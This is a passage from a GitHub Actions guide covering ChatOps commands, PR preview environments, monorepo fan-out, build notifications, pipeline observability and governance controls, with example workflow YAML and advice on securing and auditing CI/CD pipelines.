      id-token: write
    steps:
      - name: Check the commenter is authorised
        uses: actions/github-script@v9
        with:
          script: |
            const { data: perm } = await github.rest.repos.getCollaboratorPermissionLevel({
              ...context.repo, username: context.payload.comment.user.login });
            if (!['admin', 'write'].includes(perm.permission)) {
              await github.rest.reactions.createForIssueComment({
                ...context.repo, comment_id: context.payload.comment.id, content: '-1' });
              core.setFailed('Commenter lacks write permission');
            }

      - name: Acknowledge
        uses: actions/github-script@v9
        with:
          script: |
            await github.rest.reactions.createForIssueComment({
              ...context.repo, comment_id: context.payload.comment.id, content: 'rocket' });

      - name: Parse the command
        id: cmd
        env:
          BODY: ${{ github.event.comment.body }}
        run: |
          # NOTE: read from env, never interpolate the comment body into the script
          CMD="$(printf '%s' "$BODY" | head -1 | awk '{print $1}')"
          ARG="$(printf '%s' "$BODY" | head -1 | awk '{print $2}')"
          case "$CMD" in
            /deploy-preview|/run-e2e|/rebase|/retest) ;;
            *) echo "::error::Unknown command $CMD"; exit 1 ;;
          esac
          echo "cmd=$CMD" >> "$GITHUB_OUTPUT"
          echo "arg=$ARG" >> "$GITHUB_OUTPUT"

      - uses: actions/checkout@v7
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head

      - name: Execute
        run: |
          case "${{ steps.cmd.outputs.cmd }}" in
            /deploy-preview) ./scripts/deploy-preview.sh "${{ github.event.issue.number }}" ;;
            /run-e2e)        npx playwright test ;;
            /retest)         mvn -B verify ;;
          esac
```

⚠️⚠️ **Three security requirements for ChatOps, all mandatory:**
1. **Verify the commenter's permission.** `issue_comment` fires for *anyone* who can comment, including random users on a public repo.
2. **Never interpolate the comment body into a shell script.** Read it from `env:` and parse it defensively. `${{ github.event.comment.body }}` inside `run:` is a remote code execution vulnerability (§48.3).
3. **Allowlist commands.** Never `eval` whatever was typed.

### 38.5 Ephemeral PR preview environments

```yaml
# .github/workflows/pr-preview.yml
name: PR Preview
on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

permissions:
  contents: read

jobs:
  deploy:
    if: github.event.action != 'closed' && github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-24.04
    environment:
      name: preview-pr-${{ github.event.pull_request.number }}
      url: https://pr-${{ github.event.pull_request.number }}.preview.example.com
    permissions: { contents: read, id-token: write, pull-requests: write }
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: ${{ vars.PREVIEW_ROLE_ARN }}, aws-region: ap-south-1 }
      - run: |
          NS="pr-${{ github.event.pull_request.number }}"
          helm upgrade --install "$NS" ./charts/api \
            --namespace "$NS" --create-namespace \
            --set image.tag="${GITHUB_SHA}" \
            --set ingress.host="pr-${{ github.event.pull_request.number }}.preview.example.com" \
            --wait --timeout 10m

  teardown:
    if: github.event.action == 'closed'
    runs-on: ubuntu-24.04
    permissions: { id-token: write, contents: read }
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: ${{ vars.PREVIEW_ROLE_ARN }}, aws-region: ap-south-1 }
      - run: kubectl delete namespace "pr-${{ github.event.pull_request.number }}" --ignore-not-found
```

💰 Always build the teardown. Preview environments that are never destroyed are one of the most reliable ways to run up a cloud bill. Add a nightly reaper that deletes preview namespaces older than 7 days as a backstop, in case the `closed` event is missed.

---
## Chapter 39 — Category L: Orchestration and Monorepo Fan-Out

**Purpose:** run only the work that is needed, and coordinate work across jobs, workflows and repositories.

### 39.1 Change detection

```yaml
  changes:
    runs-on: ubuntu-24.04
    outputs:
      api: ${{ steps.filter.outputs.api }}
      worker: ${{ steps.filter.outputs.worker }}
      infra: ${{ steps.filter.outputs.infra }}
      shared: ${{ steps.filter.outputs.shared }}
      services: ${{ steps.matrix.outputs.services }}
    steps:
      - uses: actions/checkout@v7
      - uses: dorny/paths-filter@v4
        id: filter
        with:
          filters: |
            shared:
              - 'libs/**'
              - 'pom.xml'
            api:
              - 'services/api/**'
              - 'libs/**'
            worker:
              - 'services/worker/**'
              - 'libs/**'
            infra:
              - 'infra/**'
              - 'charts/**'

      - id: matrix
        run: |
          SERVICES='[]'
          [ "${{ steps.filter.outputs.api }}" = "true" ]    && SERVICES="$(jq -c '. + ["api"]' <<< "$SERVICES")"
          [ "${{ steps.filter.outputs.worker }}" = "true" ] && SERVICES="$(jq -c '. + ["worker"]' <<< "$SERVICES")"
          echo "services=$SERVICES" >> "$GITHUB_OUTPUT"
```

Note `libs/**` appearing under both `api` and `worker` — a change to a shared library must rebuild every consumer. Getting this dependency mapping right is the entire difficulty of monorepo CI.

### 39.2 Fan-out with a reusable workflow

```yaml
  build:
    needs: changes
    if: needs.changes.outputs.services != '[]'
    strategy:
      fail-fast: false
      matrix:
        service: ${{ fromJSON(needs.changes.outputs.services) }}
    uses: ./.github/workflows/reusable-service-ci.yml
    with:
      service: ${{ matrix.service }}
    secrets: inherit
```

```mermaid
flowchart TD
    A["Push / PR"] --> B["detect-changes job<br/>git diff vs base"]
    B --> C{"Which paths changed?"}
    C -->|"services/api + libs"| D1["matrix leg: api"]
    C -->|"services/worker"| D2["matrix leg: worker"]
    C -->|"infra/"| D3["terraform plan"]
    C -->|"nothing relevant"| D4["all legs skipped"]
    D1 --> G["CI Gate<br/>if: always()"]
    D2 --> G
    D3 --> G
    D4 --> G
    G --> H["Required status check"]
```

### 39.3 Build-graph-aware tools

For large monorepos, path filters stop scaling. Use the build system's own dependency graph:

```yaml
# Nx
- run: npx nx affected -t build test lint --base=origin/main --head=HEAD

# Turborepo
- run: npx turbo run build test --filter='...[origin/main]'

# Gradle
- run: ./gradlew :services:api:build --configuration-cache

# Bazel
- run: |
    bazel query "rdeps(//..., set($(git diff --name-only origin/main | tr '\n' ' ')))" \
      --output package > affected.txt
    bazel test $(cat affected.txt)
```

These understand that `libs/common` → `services/api` without you maintaining a hand-written mapping.

### 39.4 Cross-repository orchestration

**Triggering another repo:**

```yaml
      - uses: actions/create-github-app-token@v2
        id: token
        with:
          app-id: ${{ vars.BOT_APP_ID }}
          private-key: ${{ secrets.BOT_APP_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}
          repositories: downstream-service

      - name: Trigger downstream build
        env:
          GH_TOKEN: ${{ steps.token.outputs.token }}
        run: |
          gh api --method POST \
            /repos/my-org/downstream-service/dispatches \
            -f event_type=upstream-released \
            -F 'client_payload[version]=${{ needs.release.outputs.version }}' \
            -F 'client_payload[source_run]=${{ github.run_id }}'
```

**Receiving:**

```yaml
on:
  repository_dispatch:
    types: [upstream-released]

jobs:
  update:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Upstream released ${{ github.event.client_payload.version }}"
```

**Waiting for a downstream result** — do not poll from a job (you pay for the wait). Instead invert it: let the downstream workflow report back via `repository_dispatch` or by updating a commit status.

### 39.5 Fan-in: aggregating matrix results

```yaml
  aggregate:
    needs: build
    if: always()
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v8
        with:
          pattern: results-*
          path: results
          merge-multiple: false

      - name: Build a combined report
        run: |
          {
            echo "## Build results"
            echo ""
            echo "| Service | Result | Duration | Coverage |"
            echo "|---|---|---|---|"
            for d in results/*/; do
              jq -r '"| \(.service) | \(.result) | \(.duration)s | \(.coverage)% |"' "$d/summary.json"
            done
          } >> "$GITHUB_STEP_SUMMARY"
```

### 39.6 Workflow chaining with `workflow_run`

```mermaid
flowchart LR
    A["ci.yml<br/>on: pull_request<br/>untrusted, no secrets"] -->|"workflow_run: completed"| B["report.yml<br/>on: workflow_run<br/>trusted, write token"]
    B --> C["Post PR comment"]
    D["build.yml<br/>on: push main"] -->|"workflow_run: completed"| E["deploy.yml<br/>on: workflow_run"]
    E --> F["Deploy to staging"]
```

⚠️ Limitations of `workflow_run` chains:
- The downstream workflow **always** runs the default-branch version of the file, which makes testing changes to it awkward.
- It does **not** appear as a check on the PR by default — you must create a check run explicitly.
- Chains add latency (each hop is a fresh queue + runner boot).

Prefer `needs:` within one workflow. Use `workflow_run` when you specifically need the privilege boundary or the default-branch guarantee.

---

## Chapter 40 — Category M: Notifications and Alerting

**Purpose:** get the right signal to the right human, fast, without creating noise fatigue.

### 40.1 The notification hierarchy

| Event | Channel | Urgency |
|---|---|---|
| PR check failed | GitHub UI + PR status. **Nothing else** | The author is already looking |
| `main` build broken | Team Slack channel, @here | Blocks everyone |
| Deploy to staging succeeded | Low-volume Slack channel or nothing | FYI |
| Deploy to production | Slack + deployment record | Audit |
| Deploy to production **failed** | Slack @here + PagerDuty if user-facing | Urgent |
| Nightly build failed | GitHub issue, Slack digest next morning | Not urgent |
| Security scan found a critical CVE | Security channel + auto-issue | Same day |
| Scheduled job did not run at all | Monitoring system, not Actions | Urgent |

🧠 **The rule: never notify about things people are already watching.** A Slack message for every PR check failure trains everyone to mute the channel, and then the message about production being down gets missed too.

### 40.2 Slack

```yaml
  notify:
    needs: [build, deploy]
    if: always()
    runs-on: ubuntu-24.04
    steps:
      - name: Slack notification
        uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            blocks:
              - type: header
                text:
                  type: plain_text
                  text: "${{ needs.deploy.result == 'success' && '✅' || '🔴' }} Deploy ${{ needs.deploy.result }}"
              - type: section
                fields:
                  - type: mrkdwn
                    text: "*Service:*\n${{ github.event.repository.name }}"
                  - type: mrkdwn
                    text: "*Environment:*\nproduction"
                  - type: mrkdwn
                    text: "*Version:*\n`${{ needs.build.outputs.version }}`"
                  - type: mrkdwn
                    text: "*By:*\n@${{ github.triggering_actor }}"
              - type: section
                text:
                  type: mrkdwn
                  text: "*Commit:* <${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }}|${{ github.sha }}>"
              - type: actions
                elements:
                  - type: button
                    text: { type: plain_text, text: "View run" }
                    url: "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
```

For richer interactions (buttons that trigger a rollback), use a Slack app with a bot token rather than an incoming webhook.

### 40.3 Discord

```yaml
      - name: Discord notification
        if: failure()
        run: |
          curl -sf -H "Content-Type: application/json" -X POST "$DISCORD_WEBHOOK" -d @- <<JSON
          {
            "username": "CI",
            "embeds": [{
              "title": "🔴 Build failed: ${{ github.workflow }}",
              "url": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}",
              "color": 15158332,
              "fields": [
                { "name": "Repository", "value": "${{ github.repository }}", "inline": true },
                { "name": "Branch",     "value": "${{ github.ref_name }}",   "inline": true },
                { "name": "Actor",      "value": "${{ github.actor }}",      "inline": true }
              ],
              "timestamp": "$(date -u +%FT%TZ)"
            }]
          }
          JSON
        env:
          DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
```

### 40.4 Only notify when the status *changes*

The highest-value refinement. Nobody needs "main is still broken" every 20 minutes.

```yaml
# .github/workflows/main-status.yml
name: Main branch status
on:
  workflow_run:
    workflows: ["CI"]
    branches: [main]
    types: [completed]

permissions:
  actions: read

jobs:
  notify-on-transition:
    runs-on: ubuntu-24.04
    steps:
      - id: prev
        uses: actions/github-script@v9
        with:
          script: |
            const runs = await github.rest.actions.listWorkflowRuns({
              ...context.repo,
              workflow_id: context.payload.workflow_run.workflow_id,
              branch: 'main',
              status: 'completed',
              per_page: 2,
            });
            const [current, previous] = runs.data.workflow_runs;
            core.setOutput('current', current?.conclusion ?? 'unknown');
            core.setOutput('previous', previous?.conclusion ?? 'unknown');
            core.setOutput('changed',
              String(current?.conclusion !== previous?.conclusion));

      - name: Broken
        if: steps.prev.outputs.changed == 'true' && steps.prev.outputs.current == 'failure'
        uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "🔴 <!here> *main is broken* — ${{ github.event.workflow_run.head_commit.message }} by ${{ github.event.workflow_run.head_commit.author.name }}\n${{ github.event.workflow_run.html_url }}"

      - name: Fixed
        if: steps.prev.outputs.changed == 'true' && steps.prev.outputs.current == 'success'
        uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "✅ *main is green again* — fixed by ${{ github.event.workflow_run.head_commit.author.name }}"
```

### 40.5 Paging for real incidents

```yaml
      - name: Page on-call
        if: failure() && inputs.environment == 'production'
        run: |
          curl -sf -X POST https://events.pagerduty.com/v2/enqueue \
            -H 'Content-Type: application/json' -d @- <<JSON
          {
            "routing_key": "$PD_KEY",
            "event_action": "trigger",
            "dedup_key": "gha-deploy-${{ github.repository }}-production",
            "payload": {
              "summary": "Production deploy failed: ${{ github.repository }}",
              "severity": "critical",
              "source": "github-actions",
              "custom_details": {
                "run_url": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}",
                "commit": "${{ github.sha }}",
                "actor": "${{ github.triggering_actor }}"
              }
            }
          }
          JSON
        env:
          PD_KEY: ${{ secrets.PAGERDUTY_ROUTING_KEY }}
```

`dedup_key` prevents five retries from creating five pages.

### 40.6 A reusable notification action

Standardise it once:

```yaml
# .github/actions/notify/action.yml
name: Notify
description: Send a consistent build/deploy notification
inputs:
  status:      { required: true }
  channel:     { required: true, description: 'ci | deploys | incidents' }
  webhook:     { required: true }
  title:       { required: true }
  details:     { required: false, default: '' }
runs:
  using: composite
  steps:
    - shell: bash
      env:
        WEBHOOK: ${{ inputs.webhook }}
        STATUS: ${{ inputs.status }}
        TITLE: ${{ inputs.title }}
        DETAILS: ${{ inputs.details }}
      run: |
        EMOJI="✅"; [ "$STATUS" != "success" ] && EMOJI="🔴"
        jq -n --arg t "$EMOJI $TITLE" --arg d "$DETAILS" \
              --arg u "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}" \
          '{text: ($t + "\n" + $d + "\n" + $u)}' \
        | curl -sf -H 'Content-Type: application/json' -d @- "$WEBHOOK"
```

---

## Chapter 41 — Category N: Observability and Analytics Workflows

**Purpose:** treat your pipeline as a production system — measure it, find bottlenecks, and detect regressions.

🧠 Most teams have zero observability on CI/CD. They know a build "feels slow" but cannot say whether p95 went from 6 to 11 minutes over the last quarter, which step regressed, or how much flakiness costs them per week. This chapter fixes that.

### 41.1 What to measure

```mermaid
flowchart TD
    subgraph SPEED["Speed"]
        S1["Queue time — how long before a runner picks it up"]
        S2["Job duration p50 / p95 / p99"]
        S3["Step-level duration"]
        S4["Total PR gate wall-clock time"]
        S5["Cache hit rate"]
    end
    subgraph QUALITY["Quality"]
        Q1["Success rate per workflow"]
        Q2["Flaky rate — failures that pass on rerun"]
        Q3["Mean time to green after a break"]
        Q4["Rerun count per PR"]
    end
    subgraph DELIVERY["DORA"]
        D1["Deployment frequency"]
        D2["Lead time: commit → production"]
        D3["Change failure rate"]
        D4["Time to restore"]
    end
    subgraph COST["Cost"]
        C1["Billable minutes by workflow"]
        C2["Minutes by runner type"]
        C3["Storage: artifacts + cache + packages"]
        C4["Cost per deployment"]
    end
```

### 41.2 Built-in surfaces

| Surface | Where | What it gives you |
|---|---|---|
| Job graph / timing | Run page | Per-job durations, the critical path |
| **Job summaries** | Run page | Whatever Markdown you write |
| Annotations | PR diff + run page | Inline errors and warnings |
| **Actions usage metrics** | Org/repo Insights → Actions | Minutes and runs by workflow, over time |
| **Actions performance metrics** | Insights → Actions | Run duration, queue time, failure rate per workflow |
| Billing page | Org settings | Minutes and storage consumed |
| Audit log | Org settings | Who changed secrets, environments, policies |
| REST API | `/repos/:o/:r/actions/runs` | Everything above, programmatically |

Start with Insights. It is free and answers "which workflow eats our minutes" in one screen.

### 41.3 Exporting run data to your own store

```yaml
# .github/workflows/ci-metrics.yml
name: CI metrics export
on:
  workflow_run:
    workflows: ['**']
    types: [completed]

permissions:
  actions: read
  id-token: write

jobs:
  export:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Collect run and job timings
        id: collect
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          RUN_ID: ${{ github.event.workflow_run.id }}
        run: |
          set -euo pipefail
          gh api "/repos/${GITHUB_REPOSITORY}/actions/runs/${RUN_ID}" > run.json
          gh api --paginate "/repos/${GITHUB_REPOSITORY}/actions/runs/${RUN_ID}/jobs" > jobs.json

          jq -n --slurpfile r run.json --slurpfile j jobs.json '
            ($r[0]) as $run |
            {
              repository:  env.GITHUB_REPOSITORY,
              workflow:    $run.name,
              run_id:      $run.id,
              run_number:  $run.run_number,
              run_attempt: $run.run_attempt,
              event:       $run.event,
              branch:      $run.head_branch,
              conclusion:  $run.conclusion,
              actor:       $run.actor.login,
              created_at:  $run.created_at,
              started_at:  $run.run_started_at,
              updated_at:  $run.updated_at,
              queue_seconds:
                (($run.run_started_at | fromdateiso8601) - ($run.created_at | fromdateiso8601)),
              total_seconds:
                (($run.updated_at | fromdateiso8601) - ($run.run_started_at | fromdateiso8601)),
              jobs: [ $j[0].jobs[] | {
                name, conclusion, runner_name, labels,
                queue_seconds: ((.started_at|fromdateiso8601) - (.created_at|fromdateiso8601)),
                duration_seconds: ((.completed_at|fromdateiso8601) - (.started_at|fromdateiso8601)),
                steps: [ .steps[]? | {
                  name, conclusion, number,
                  duration_seconds:
                    (if .started_at and .completed_at
                     then ((.completed_at|fromdateiso8601) - (.started_at|fromdateiso8601))
                     else null end)
                } ]
              } ]
            }' > metrics.json
          cat metrics.json | jq -c .

      - name: Ship to the metrics backend
        env:
          OTLP_ENDPOINT: ${{ vars.OTLP_ENDPOINT }}
          OTLP_TOKEN: ${{ secrets.OTLP_TOKEN }}
        run: |
          curl -sf -X POST "$OTLP_ENDPOINT/v1/ci-metrics" \
            -H "Authorization: Bearer $OTLP_TOKEN" \
            -H 'Content-Type: application/json' \
            --data-binary @metrics.json
```

⚠️ Note this workflow runs on `workflow_run` for **every** workflow. Keep it cheap and give it a short timeout, or it becomes a meaningful share of your own minutes.

### 41.4 OpenTelemetry tracing for pipelines

The richest option: turn each workflow run into a distributed trace, with jobs as spans and steps as child spans. You then see the critical path in Jaeger/Grafana/Datadog exactly as you would for a request trace.

```yaml
  trace:
    runs-on: ubuntu-24.04
    steps:
      - uses: corentinmusard/otel-cicd-action@v2
        with:
          otlpEndpoint: ${{ vars.OTLP_ENDPOINT }}
          otlpHeaders: "authorization=Bearer ${{ secrets.OTLP_TOKEN }}"
          githubToken: ${{ secrets.GITHUB_TOKEN }}
          runId: ${{ github.event.workflow_run.id }}
```

There is an emerging OpenTelemetry **CI/CD semantic convention** (`cicd.pipeline.*` attributes), and several vendors ship actions and OTel Collector receivers for GitHub. If you already run an OTel Collector, adding a GitHub receiver gives you pipeline telemetry in the same place as your application telemetry — which is the point: one query language, one dashboard, one alerting system.

```mermaid
flowchart LR
    GH["GitHub workflow_run<br/>+ workflow_job webhooks"] --> C["OpenTelemetry Collector<br/>github receiver"]
    API["GitHub REST API<br/>scraper"] --> C
    C --> P["Prometheus<br/>metrics"]
    C --> T["Tempo / Jaeger<br/>traces"]
    P --> G["Grafana dashboards<br/>+ alerts"]
    T --> G
```

### 41.5 A weekly CI health report

```yaml
# .github/workflows/ci-report.yml
name: Weekly CI report
on:
  schedule: [{ cron: '0 9 * * 1' }]
  workflow_dispatch:

permissions:
  actions: read
  issues: write

jobs:
  report:
    runs-on: ubuntu-24.04
    steps:
      - name: Build the report
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          set -euo pipefail
          SINCE="$(date -u -d '7 days ago' +%Y-%m-%d)"
          gh api --paginate "/repos/${GITHUB_REPOSITORY}/actions/runs?created=>=${SINCE}&per_page=100" \
            --jq '.workflow_runs[]' > runs.jsonl

          {
            echo "## CI health — week to $(date -u +%Y-%m-%d)"
            echo ""
            echo "| Workflow | Runs | Success | Failure | Success rate | Median duration |"
            echo "|---|---:|---:|---:|---:|---:|"
            jq -s -r '
              group_by(.name)[]
              | {
                  name: .[0].name,
                  total: length,
                  ok: ([.[] | select(.conclusion=="success")] | length),
                  bad: ([.[] | select(.conclusion=="failure")] | length),
                  med: ([.[]
                          | select(.run_started_at and .updated_at)
                          | ((.updated_at|fromdateiso8601) - (.run_started_at|fromdateiso8601))]
                        | sort | if length>0 then .[length/2|floor] else 0 end)
                }
              | "| \(.name) | \(.total) | \(.ok) | \(.bad) | \((100*.ok/.total)|floor)% | \((.med/60)|floor)m |"
            ' runs.jsonl
            echo ""
            echo "### Most rerun workflows (a proxy for flakiness)"
            echo ""
            jq -s -r '
              [.[] | select(.run_attempt > 1)] | group_by(.name)[]
              | "- \(.[0].name): \(length) reruns"' runs.jsonl
          } > report.md

          cat report.md >> "$GITHUB_STEP_SUMMARY"

      - uses: actions/github-script@v9
        with:
          script: |
            const fs = require('fs');
            await github.rest.issues.create({
              ...context.repo,
              title: `CI health report — week of ${new Date().toISOString().slice(0,10)}`,
              body: fs.readFileSync('report.md','utf8'),
              labels: ['ci-health','automated'],
            });
```

### 41.6 Flaky test detection

```yaml
  detect-flakes:
    if: github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.run_attempt > 1
    runs-on: ubuntu-24.04
    steps:
      - name: A rerun that passed means a flake
        uses: actions/github-script@v9
        with:
          script: |
            const run = context.payload.workflow_run;
            const title = `Flaky CI: ${run.name} on ${run.head_branch}`;
            const { data: issues } = await github.rest.issues.listForRepo({
              ...context.repo, state: 'open', labels: 'flaky' });
            const existing = issues.find(i => i.title === title);
            const body = `Run #${run.run_number} failed on attempt 1 and passed on attempt ${run.run_attempt}.\n${run.html_url}`;
            if (existing) await github.rest.issues.createComment({ ...context.repo, issue_number: existing.number, body });
            else await github.rest.issues.create({ ...context.repo, title, body, labels: ['flaky','ci-health'] });
```

🧠 This is a crude but remarkably effective heuristic: **anything that fails then passes on rerun without a code change is flaky.** Accumulating those into one issue per workflow gives you a ranked list of what to fix.

### 41.7 DORA metrics from Actions data

| Metric | How to derive it |
|---|---|
| **Deployment frequency** | Count successful runs of your deploy workflow targeting `environment: production` |
| **Lead time for changes** | `deployment.created_at` minus the merged PR's first commit timestamp |
| **Change failure rate** | Deploys followed within N hours by a rollback workflow run or an incident label |
| **Time to restore** | Timestamp of the rollback/fix deploy minus the incident start |

```yaml
      - name: Emit a deployment-frequency datapoint
        run: |
          curl -sf -X POST "$METRICS_URL/dora/deployment" \
            -H "Authorization: Bearer $METRICS_TOKEN" \
            -d "$(jq -n \
              --arg svc "${{ github.event.repository.name }}" \
              --arg sha "${GITHUB_SHA}" \
              --arg env "production" \
              --arg ts  "$(date -u +%FT%TZ)" \
              --arg lead "${{ steps.lead.outputs.seconds }}" \
              '{service:$svc, commit:$sha, environment:$env, deployed_at:$ts, lead_time_seconds:($lead|tonumber)}')"
```

### 41.8 Alerting on the pipeline itself

Things worth alerting on:

- **A scheduled workflow has not run in N hours.** The most commonly missed failure mode — Actions incidents, disabled workflows and cron drift all look like silence.
- **Success rate on `main` drops below 90% over 24 h.**
- **p95 PR gate duration exceeds your target** (say 12 minutes).
- **Billable minutes exceed budget** for the month to date.
- **Queue time p95 exceeds 2 minutes** — you need more concurrency or more runners.

Implement these in your monitoring system fed by §41.3, not in Actions itself. A pipeline cannot reliably alert on its own absence.

---

## Chapter 42 — Category O: Governance and Compliance

**Purpose:** prove, continuously, that your delivery process meets policy — without manual audits.

### 42.1 Licence compliance

```yaml
  licences:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }

      - name: Generate a licence report
        run: mvn -B -ntp license:aggregate-third-party-report

      - name: Enforce the allowlist
        run: |
          set -euo pipefail
          DENIED='GPL-3.0|AGPL|SSPL|BUSL|Commons Clause'
          if grep -Ei "$DENIED" target/site/aggregate-third-party-report.html; then
            echo "::error::A dependency uses a forbidden licence"
            exit 1
          fi
```

### 42.2 Policy as code over your own workflows

Lint your workflows against organisational rules:

```yaml
  workflow-policy:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - name: Enforce workflow policy
        run: |
          set -euo pipefail
          FAIL=0
          for f in .github/workflows/*.yml; do
            # every workflow must declare permissions
            grep -q '^permissions:' "$f" || { echo "::error file=$f::No top-level permissions: block"; FAIL=1; }
            # every job must have a timeout
            JOBS=$(yq '.jobs | keys | length' "$f")
            TOS=$(yq '[.jobs[] | select(has("timeout-minutes"))] | length' "$f")
            [ "$JOBS" = "$TOS" ] || { echo "::error file=$f::Not all jobs set timeout-minutes"; FAIL=1; }
            # third-party actions must be SHA-pinned
            grep -oP 'uses:\s*\K[^\s]+' "$f" \
              | grep -v '^\./' \
              | grep -vE '^(actions|github|docker|aws-actions|google-github-actions|azure)/' \
              | grep -vE '@[0-9a-f]{40}$' \
              | while read -r a; do
                  echo "::error file=$f::Third-party action not pinned to a SHA: $a"
                  exit 1
                done || FAIL=1
          done
          exit $FAIL
```

Or with Rego + conftest for something maintainable at scale:

```rego
package workflows

deny[msg] {
  input.on.pull_request_target
  msg := "pull_request_target is not permitted; use pull_request + workflow_run"
}

deny[msg] {
  job := input.jobs[name]
  not job["timeout-minutes"]
  msg := sprintf("job '%v' has no timeout-minutes", [name])
}

deny[msg] {
  not input.permissions
  msg := "workflow must declare a top-level permissions block"
}
```

### 42.3 Workflow execution protections

📌 **Generally available since September 2026.** This is the strongest governance primitive Actions has.

Execution protections let an admin define an allowlist controlling **who** can trigger a workflow (actor rules) and **which events** are permitted to start it (event rules). They are built on the rulesets framework and evaluated before a run starts; disallowed runs fail with an explicit error such as `Event 'workflow_dispatch' is not allowed to trigger Actions workflows`.

General availability added three things beyond the preview:

- **Workflow file targeting** — scope a rule to a specific workflow file rather than the whole repository, so you can restrict `deploy.yml` to a designated team while leaving CI workflows open to all contributors.
- **Insights** — see how rules are evaluated and enforced across an enterprise, organisation or repository, so you can audit impact and tune rules before and after enforcement.
- **A REST API** — create, read, update and delete rules including workflow path conditions, at enterprise, organisation or repository level, so Actions policy can be managed as code.

Actor rules cover individual users, repository roles, GitHub Apps, Copilot and Dependabot.

⚠️ **The default `pull_request_target` block.** GitHub has added a default policy that disables `pull_request_target` in public repositories that do not already have an applicable event policy, aimed at preventing pipeline poisoning from forks. It runs in evaluate mode first and **becomes enforced on 2 November 2026**. It does not apply to private or internal repositories. If you rely on `pull_request_target` in a public repo, either migrate to the `pull_request` + `workflow_run` pattern (§6.9) or explicitly allow the event in a policy.

Practical policy set for a production organisation:

| Workflow | Actor rule | Event rule |
|---|---|---|
| `deploy-production.yml` | `@platform-team`, `@sre` only | `workflow_dispatch`, `release` only |
| `ops-runbook.yml` | `@sre`, repo admins | `workflow_dispatch` only |
| `ci.yml` | anyone | `pull_request`, `push`, `merge_group` |
| `release.yml` | `@release-managers` | `push` (tags) |
| all | — | `pull_request_target` denied |

### 42.4 Required workflows via rulesets

Organisation → Rulesets → new ruleset → "Require workflows to pass before merging". This injects a workflow into every matching repository's required checks, regardless of what that repo's own workflows do.

Use it for: mandatory security scanning, licence checks, SBOM generation. It is how a platform team guarantees a control exists in 200 repos without editing 200 repos.

### 42.5 The audit evidence workflow

Many compliance frameworks (SOC 2, ISO 27001, PCI) require you to demonstrate that changes are reviewed, tested and approved. Actions already generates all of that evidence; the workflow just collects it.

```yaml
# .github/workflows/compliance-evidence.yml
name: Compliance evidence
on:
  schedule: [{ cron: '0 6 1 * *' }]        # monthly
  workflow_dispatch:
    inputs:
      since: { type: string, description: 'YYYY-MM-DD' }

permissions:
  actions: read
  contents: read
  deployments: read
  pull-requests: read

jobs:
  evidence:
    runs-on: ubuntu-24.04
    steps:
      - name: Collect production deployment evidence
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          set -euo pipefail
          SINCE="${{ inputs.since || '' }}"
          SINCE="${SINCE:-$(date -u -d '1 month ago' +%Y-%m-%d)}"

          gh api --paginate "/repos/${GITHUB_REPOSITORY}/deployments?environment=production" \
            --jq '.[] | {id, sha, created_at, creator: .creator.login, ref}' > deployments.jsonl

          {
            echo "# Production deployment evidence"
            echo ""
            echo "Period: ${SINCE} to $(date -u +%Y-%m-%d)"
            echo "Repository: ${GITHUB_REPOSITORY}"
            echo ""
            echo "| Deployment | Commit | Deployed by | Date | PR | Approved by |"
            echo "|---|---|---|---|---|---|"
            while read -r d; do
              SHA="$(jq -r .sha <<< "$d")"
              PR="$(gh api "/repos/${GITHUB_REPOSITORY}/commits/${SHA}/pulls" --jq '.[0].number // "direct"')"
              APPROVERS="$( [ "$PR" != "direct" ] && \
                gh api "/repos/${GITHUB_REPOSITORY}/pulls/${PR}/reviews" \
                  --jq '[.[] | select(.state=="APPROVED") | .user.login] | unique | join(", ")' || echo "—")"
              jq -r --arg pr "$PR" --arg ap "$APPROVERS" \
                '"| \(.id) | \(.sha[0:8]) | \(.creator) | \(.created_at) | #\($pr) | \($ap) |"' <<< "$d"
            done < deployments.jsonl
          } > evidence.md

          cat evidence.md >> "$GITHUB_STEP_SUMMARY"

      - uses: actions/upload-artifact@v7
        with:
          name: compliance-evidence-${{ github.run_id }}
          path: |
            evidence.md
            deployments.jsonl
          retention-days: 400
```

🧠 The point: **your pipeline is your compliance evidence.** If deployments only happen through workflows, and workflows only run with approvals recorded in environments, then the audit question "show me that every production change was reviewed" becomes a query instead of a fire drill.

### 42.6 Governance checklist

- [ ] Default `GITHUB_TOKEN` permissions set to read-only at the org level.
- [ ] Allowed actions restricted to an explicit allowlist.
- [ ] "Require SHA pinning" enabled.
- [ ] `pull_request_target` denied by an event policy.
- [ ] Production environments have required reviewers and branch restrictions.
- [ ] Deploy workflows restricted by actor rules.
- [ ] Cloud roles bound to `environment:` or `job_workflow_ref` OIDC claims, never `repo:*`.
